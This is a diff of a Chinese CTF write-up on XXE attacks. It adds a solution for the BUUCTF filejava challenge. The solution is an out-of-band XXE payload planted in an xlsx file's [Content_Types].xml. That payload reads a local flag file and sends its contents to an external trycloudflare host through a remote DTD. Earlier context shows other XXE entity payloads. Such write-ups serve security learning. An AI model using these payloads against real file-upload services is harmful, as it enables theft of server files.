@@ -350,7 +350,7 @@ excel表实质上是一个压缩包，大量使用了xml格式的文件来存储
 ]>
 <user><username>&root;</username><password>asdg</password></user>
 ```  
-![alt text](image-27.png)
+![alt text](image-27.png)  
 发现ip10.244.244.20，爆破ip最后一位  
 ![alt text](image-28.png)  
 不过出问题了，要设置timeout，不然就需要很久，但是作者并不知道如何在yakit中设置，稍微等一会也可以
@@ -388,5 +388,24 @@ python hello.py > out.txt
 <root> <username>&f;</username> <password>asdg</password> </root>
 ```  
 可以找到  
-![alt text](image-31.png)
+![alt text](image-31.png)  
+
+## BUUCTF [网鼎杯 2020 青龙组]filejava  
+![alt text](image-33.png)  
+启动httpd服务，内网穿透  
+kk.txt  
+```xml
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'https://voluntary-sequences-arlington-isaac.trycloudflare.com/get.php?a=%file;'>">
+```  
+新建excel文件，解压，在[Content_Types].xml中添加  
+```xml
+<!DOCTYPE ws [
+<!ENTITY % file SYSTEM "file://flag">
+<!ENTITY % out SYSTEM "https://voluntary-sequences-arlington-isaac.trycloudflare.com/kk.txt">
+%out;%int;%send;
+]>
+```  
+重新压缩，修改后缀为xlsx，上传文件，查看test.txt  
+![alt text](image-34.png)  
+
 
